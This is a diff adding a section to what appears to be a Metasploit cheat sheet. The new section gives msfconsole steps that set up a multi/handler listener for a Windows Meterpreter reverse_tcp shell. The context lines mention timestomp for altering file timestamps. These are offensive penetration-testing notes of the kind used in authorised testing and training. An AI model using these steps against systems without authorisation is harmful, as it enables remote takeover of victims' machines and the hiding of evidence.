@@ -178,3 +178,29 @@ Priv: Timestomp Commands
     -------       -----------
     timestomp     Manipulate file MACE attributes
 ```
+
+
+
+# Open Listener for Reverse Shell
+
+```
+msfconsole
+
+msf> use exploit/multi/handler
+
+msf  exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+
+msf  exploit(multi/handler) > options (to list everything it needs to work)
+
+msf  exploit(multi/handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55)
+
+msf exploit(multi/handler) > set LPORT <Listening_Port> (for example set LPORT 4444)
+
+msf exploit(multi/handler) > run
+```
+
+
+
+
+
+
